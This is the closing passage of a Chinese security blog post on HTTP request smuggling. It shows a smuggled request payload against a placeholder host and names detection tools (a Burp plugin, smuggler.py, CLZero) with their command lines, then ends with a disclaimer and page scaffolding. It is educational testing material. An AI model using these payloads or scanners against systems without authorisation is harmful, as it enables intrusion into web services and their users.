+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/404</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>xPOST /search HTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-abnf"><span class="hljs-attribute">q</span><span class="hljs-operator">=</span>smuggling</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="06工具检测"><a href="#06工具检测" class="headerlink" title="06工具检测"></a>06工具检测</h2><h3 id="HTTP-Request-Smuggler"><a href="#HTTP-Request-Smuggler" class="headerlink" title="HTTP Request Smuggler"></a>HTTP Request Smuggler</h3><p>Bp插件，直接在应用市场搜索安装即可<br><img src="/../img/20240201045644.png" srcset="/img/loading.gif" lazyload></p>
+<p> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">测试靶场</a> </p>
+<p>基础用法就是添加此插件后，在代理历史记录中找到该请求，右键单击并选择”Smuggle probe”，然后单击”确定”，在Target处如果检测到了请求走私，则会出现提示：</p>
+<p><img src="/../img/20240201045701.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果需要更深层次利用可以到 <a target="_blank" rel="noopener" href="https://github.com/portswigger/http-request-smuggler">工具地址</a> 进行了解</p>
+<h3 id="smuggler"><a href="#smuggler" class="headerlink" title="smuggler"></a>smuggler</h3><p><a target="_blank" rel="noopener" href="https://github.com/defparam/smuggler">工具地址</a>：用 Python 3 编写的 HTTP 请求走私&#x2F;异步测试工具。</p>
+<ul>
+<li>单主机：<code>python3 smuggler.py -u &lt;URL&gt;</code></li>
+<li>主机列表：<code>cat list_of_hosts.txt | python3 smuggler.py</code></li>
+</ul>
+<p>如果存在漏洞，会在终端直接限制，再到具体文件夹用具体payload进行验证</p>
+<p><img src="/../img/20240201045730.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="CLZero"><a href="#CLZero" class="headerlink" title="CLZero"></a>CLZero</h3><p><a target="_blank" rel="noopener" href="https://github.com/Moopinger/CLZero">工具地址</a>：用于模糊 HTTP&#x2F;1.1 CL.0 请求走私攻击向量的项目。</p>
+<ul>
+<li>单目标攻击：<code>python3 clzero.py -u https://www.target.com/ -c configs/default.py -skipread</code></li>
+<li>多目标攻击：<code>python3 clzero.py -l urls.txt -c configs/default.py -skipread</code></li>
+</ul>
+<h2 id="07完结"><a href="#07完结" class="headerlink" title="07完结"></a>07完结</h2><p>免责声明：本博客的内容仅供合法、正当、健康的用途，切勿将其用于违反法律法规的行为。如因此导致任何法律责任或纠纷，本博客概不负责。谢谢您的理解与配合！</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246516">参考文章1</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11423">参考文章2</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTTP Request Smuggling（HTTP 请求走私）</div>
+      <div>https://xiaobite-hacker.github.io/2024/02/01/HTTP-Request-Smuggling（HTTP-请求走私）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaobite</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/07/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="微信小程序渗透测试">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">微信小程序渗透测试</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
